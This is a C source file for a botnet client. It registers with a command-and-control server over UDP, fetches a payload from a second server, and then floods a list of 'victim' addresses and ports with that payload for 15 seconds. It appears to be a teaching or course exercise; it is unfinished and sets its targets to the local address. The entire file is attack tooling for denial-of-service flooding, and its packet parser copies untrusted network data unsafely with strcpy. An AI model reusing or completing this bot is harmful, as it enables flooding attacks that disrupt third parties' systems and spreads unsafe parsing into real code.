#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <err.h>
#include <arpa/inet.h>

#define MESSAGE_MAXLEN 512
#define PORTLEN 22

// ip addresses and port numbers of victim processes
struct pairs{
	char ip[INET_ADDRSTRLEN];
	char port[PORTLEN];
};

// packet structure which C&C server sends to bot processes
struct msg{
	char command;
	struct pairs entries[20];
	int number_of_pairs;
};

// usage
void usage(){
	fprintf(stderr, "Usage: ./bot server_ip server_port\n");
}

// function to parse the packet sent to the bot process by the C&C server
void parse_packet(struct msg *message, char *packet, int bytes_recv){
	int i = PORTLEN + INET_ADDRSTRLEN;
	bytes_recv--; // decrementing by size of char command
	int counter = bytes_recv / i;

	message->command = *packet++;

	for(i = 0; i < counter; i++){
		strcpy(message->entries[i].ip, packet);
		packet += sizeof(message->entries[i].ip);
		strcpy(message->entries[i].port, packet);
		packet += sizeof(message->entries[i].port);
	}

	message->number_of_pairs = counter;
}

	/*
	program the bot 
	sends a "HELLO\n" packet to the UDP_server and then receives the payload from UDP_server
*/
void prog(struct msg *message, char *payload){

	char *data = "HELLO\n";

	// ip address and port number of the UDP_server
	char *udp_server_ip = message->entries[0].ip;
	char *udp_server_port = message->entries[0].port;
	
	printf("%s %s\n", udp_server_ip, udp_server_port);

	struct addrinfo *udp_server;
	struct addrinfo hints;

	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_DGRAM;

	int sock;
	sock = socket(PF_INET, SOCK_DGRAM, 0);

	if(sock < 0){
		err(2, "socket error\n");
	}

	int gai_error;

	//getting info on the UDP_server
	if((gai_error = getaddrinfo(udp_server_ip, udp_server_port, &hints, &udp_server)) != 0){
		err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
	}

	//sends "HELLO\n"
	int bytes_sent = sendto(sock, data, strlen(data), 0, udp_server->ai_addr, udp_server->ai_addrlen);
	
	printf("sent package to the udp_serv\n");

	//waits for the UDP_server to send the payload
	int bytes_recv = recvfrom(sock, payload, MESSAGE_MAXLEN, 0, NULL, NULL);

	printf("%s\n", payload);
}

/*
	bot starts sending payload which it received from UDP_server
	to victim processes with ip addresses and ports which it received from 
	C&C server
*/ 
void run(struct msg *message, char *payload){


	struct timeval tstart;
	struct timeval tend;

	int i;

	char *target_ip;
	char *target_port;

	struct sockaddr_in target;
	//struct addrinfo hints;

	//memset(&hints, 0, sizeof(hints));
	//hints.ai_socktype = SOCK_DGRAM;

	int sock;
	sock = socket(PF_INET, SOCK_DGRAM, 0);

	if(sock < 0){
		err(2, "socket error\n");
	}


	// send payload for 15 seconds
	gettimeofday(&tstart, NULL);
	gettimeofday(&tend, NULL);

	while(tend.tv_sec - tstart.tv_sec < 15){
		for(i = 0; i < message->number_of_pairs; ++i){
			memset(&target, 0, sizeof(target));
			target.sin_family = AF_INET;
			target.sin_addr.s_addr = INADDR_ANY; 
			target.sin_port = htons(atoi(message->entries[i].port));

			//if((gai_error = getaddrinfo(target_ip, target_port, &hints, &target)) != 0){
			//	err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
			//}

			int bytes_sent = sendto(sock, payload, strlen(payload), 0, 
						(const struct sockaddr *) &target,
						sizeof(target));
		}

		gettimeofday(&tend, NULL);
	}
}

int main(int argc, char **argv){

	//the program requires 2 arguments
	if (argc != 3){
		usage();
		return 1;
	}

	char *server_ip = argv[1];
	char *server_port = argv[2];

	const char *data = "REG\n";
	char packet[MESSAGE_MAXLEN];
	char payload[512];

	struct msg message;

	struct addrinfo *server_address;
	struct addrinfo hints;

	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_DGRAM;

	int gai_error;

	int sock;

	sock = socket(PF_INET, SOCK_DGRAM, 0);

	if(sock < 0){
		fprintf(stderr, "socket error\n");
		return 2;
	}

	if((gai_error = getaddrinfo(server_ip, server_port, &hints, &server_address)) != 0){
		fprintf(stderr, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
		return 3;
	}

	//send "REG\n" to C&C server
	int bytes_sent = sendto(sock, data, strlen(data), 0, server_address->ai_addr, server_address->ai_addrlen);

	//receive instructions from C&C server
	int bytes_recv = recvfrom(sock, packet, MESSAGE_MAXLEN, 0, NULL, NULL);

	parse_packet(&message, packet, bytes_recv);

	if(message.command == '0'){
		prog(&message, payload);
	}

	/* wait for the C&C server to send RUN command
	 * and ip addresses and ports of the victim processes
	 * to which the payload is going to be sent
	*/
	
	bytes_recv = recvfrom(sock, packet, MESSAGE_MAXLEN, 0, NULL, NULL);

	parse_packet(&message, packet, bytes_recv);

	if(message.command == '1'){
		run(&message, payload);
	}

	/* TODO
	 * Create a while loop to process incoming messages from C&C server
	 * */
	freeaddrinfo(server_address);
	return 0;
}
